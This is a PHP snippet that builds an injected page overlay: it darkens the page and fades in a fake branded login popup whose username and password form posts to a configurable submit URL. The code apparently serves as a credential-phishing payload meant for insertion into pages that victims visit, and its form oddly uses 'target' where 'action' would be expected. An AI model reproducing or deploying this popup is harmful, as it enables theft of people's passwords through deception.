<?php
$result  = "<script src=".$jQueryURL."></script>";
$result .= "<style>";
$result .= "body{height:100%;}";
$result .= "#bP{display:none;position:fixed;_position:absolute;height:100%;";
$result .= "width:100%;top:0;left:0;background:#000;border:1px solid #cecece;z-index:1;}";
$result .= "#pC{display:none;position:fixed;_position:absolute;height:384px;width:408px;";
$result .= "background:#FFF;border:2px solid #cecece;z-index:2;padding:12px;font-size:13px;}";
$result .= "#pC h1{text-align:center;color:#000;font-size:22px;font-weight:700;";
$result .= "border-bottom:1px dotted #D3D3D3;padding-bottom:2px;margin-bottom:20px;}";
$result .= "#cI{display:block;margin-left:auto;margin-right:auto}";
$result .= "</style>";
$result .= "<script>";
$result .= "$(document).ready(function(){";
$result .= "$(\"#bP\").css({\"opacity\": \"0.7\"});";
$result .= "$(\"#bP\").fadeIn(\"slow\");";
$result .= "$(\"#pC\").fadeIn(\"slow\");";
$result .= "var wW=document.documentElement.clientWidth;";
$result .= "var wH=document.documentElement.clientHeight;";
$result .= "var pH=$(\"#pC\").height();";
$result .= "var pW=$(\"#pC\").width();";
$result .= "$(\"#pC\").css({\"position\":\"absolute\",\"top\":wH/2-pH/2";
$result .= ",\"left\":wW/2-pW/2});$(\"#bP\").css({\"height\":wH});});";
$result .= "</script>";
$result .= "<div id=pC>";
$result .= "<h1>".$loginTitle."</h1>";
$result .= "<p>";
if(isset($companyImage))
{
  $result .= "<img id=cI src=".$companyImage." /><br/>";
}
$result .= $loginText;
$result .= "<form method=POST target=".$submitURL.">";
$result .= "User:<input type=text name=u /><br/>";
$result .= "Pass:<input type=password name=p /><br/>";
$result .= "<input type=submit value=Login name=l />";
$result .= "</p>";
$result .= "</div>";
$result .= "<div id=bP></div>";
?>
